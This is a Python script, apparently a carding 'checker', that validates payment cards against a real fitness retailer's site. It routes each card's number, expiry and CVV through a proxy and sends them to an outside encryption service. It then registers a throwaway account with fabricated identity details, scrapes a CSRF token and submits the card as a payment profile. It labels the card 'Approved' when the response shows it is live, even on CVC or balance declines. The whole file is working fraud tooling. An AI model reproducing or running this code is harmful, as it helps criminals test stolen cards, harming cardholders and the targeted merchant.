import requests
import uuid
import json
from httpx import AsyncClient

async def adyenauth(cc,mes,ano,cvv,proxyg):
    async with AsyncClient(verify=False,proxy=proxyg) as web:
        email = str(uuid.uuid4()) + '@gmail.com'
        enc = requests.session()


        headers = {
            'Content-Type': 'application/json',
            'apisites': 'FREEXXXX1-SERVER-[0x10][0xf]'
        }

        json = {
                "version": 18,
                "pk": "10001|D007D1E483F4C25927B10DA5A07CBB5E1B1B5D5F9AD80A681B34548890B9C7B84E91E80E2C6FE0D428556AD75616A3F78FEF1E64EA0D2C59A2E324D373C40B97486B07682F0E3B66A6D09E73284184908665CB8916ABF656A1C1CA03E6451666956B9E0DB4344974141938C00A9BE25A465E34339E028987EA03A9345AF952AD7F6A96CC3DED0A7217BC0DD50EA7CBCB3BB50B3E203DC85A491C79A863CAD71DEF481431D29CA51D721C89522957EB9E512741BE0C960FE5D3D01BC8EFCBBFD087C0BCB41185379806323715755F4F7F59D41A6DA9A02268460003D2C8C8D02265467D8E9D1FC04F3B6A9E960497F76C4D279C9A0626EEA35325B9515981B959",
                "data": [{
                    "number": cc
                },
                {
                    "cvc": cvv
                },
                {
                    "expiryMonth": mes
                },
                {
                    "expiryYear": ano
                }]
            }
        base_url = "https://yakuza.sh-ykza-env.com"
        endpoint = "/encrypt/adyen"
        url = base_url + endpoint

        encrypt = enc.post(url, headers=headers, json=json)

        cc = encrypt.json()['response']['number']
        cvc = encrypt.json()['response']['cvc']
        month = encrypt.json()['response']['expiryMonth']
        year = encrypt.json()['response']['expiryYear']


        req1 = await web.get('https://www.soul-cycle.com/signup/')

        auth = req1.text.split('type="hidden" name="csrf_token"')[1].split('value="')[1].split('"')[0]

        headers = {
            'authority': 'www.soul-cycle.com',
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://www.soul-cycle.com',
            'referer': 'https://www.soul-cycle.com/signup/',
            'accept-language': 'es-US,es-419;q=0.9,es;q=0.8,en;q=0.7',
        }

        data = {
        "email": email,
        "password": "POTONXDXD01x",
        "confirmpassword": "POTONXDXD01x",
        "dob_placeholder": "false",
        "dob_month": "1",
        "dob_day": "24",
        "dob_year": "1992",
        "location_placeholder": "false",
        "country": "US",
        "state": "New York",
        "first_name": "MrGod",
        "last_name": "Fabián",
        "phone": "+12316613431",
        "emergency_contact_name": "MrGod Fabián",
        "emergency_contact_phone": "+19893166114",
        "agreement_id": "21",
        "opt_in_selling": "1",
        "csrf_token": auth,
        "redirect": "/suggested-series/",
        "redirectTo": "/suggested-series/",
        "disable_welcome_message": "true",
        "analytics_location": ""
        }

        req2 = await web.post('https://www.soul-cycle.com/register/', headers=headers, data=data)

        headers = {
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
            'cache-control': 'no-cache',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://www.soul-cycle.com',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://www.soul-cycle.com/profile/my_soul/about_me/',
            'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }

        data = {
            "csrf_token": auth,
            "browser-info": {
                "colorDepth": 24,
                "javaEnabled": False,
                "language": "es-ES",
                "screenHeight": 1080,
                "screenWidth": 1920,
                "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
                "timeZoneOffset": 420
            },
            "returnUrl": "https://www.soul-cycle.com/profile/my_soul/about_me/",
            "cc_brand_type": "mastercard",
            "txvariant": "card",
            "encryptedCardNumber": cc,
            "encryptedExpiryMonth": month,
            "encryptedExpiryYear": year,
            "encryptedSecurityCode": cvc,
            "billing_first_name": "asd sa",
            "billing_last_name": "d asd sa",
            "billing_country": "US",
            "billing_address_1": "103-105 Central Avenue",
            "billing_address_2": "",
            "billing_city": "Orange",
            "billing_state": "NJ",
            "billing_zip": "07050-3824",
            "shipping-same-as-billing": "on",
            "shipping_first_name": "asd sa",
            "shipping_last_name": "d asd sa",
            "shipping_country": "US",
            "shipping_address_1": "103-105 Central Avenue",
            "shipping_address_2": "",
            "shipping_city": "Orange",
            "shipping_state": "NJ",
            "shipping_zip": "07050-3824"
        }

        req3 = await web.post('https://www.soul-cycle.com/profile/my_soul/about_me/payment/', headers=headers, data=data)
        print(req3.text)
        if 'success":true' in req3.text or 'success":success' in req3.text:
            status = "Approved ✅"
            mensaje = "Approved !"
        else:
            if "reference number:" in req3.text:
                mensaje = req3.text.split('Saving payment profile failed. ')[1].split(' If you continue')[0]
            else:
                mensaje = req3.text.split('{"success":false,"message":"Saving payment profile failed. ')[1].split('"}')[0]
                
            if "CVC Declined" in mensaje:
                status = "Approved ✅"
            elif "not enough balance" in mensaje:
                status = "Approved ✅"
            else:
                status = "Declined ❌"
        return status,mensaje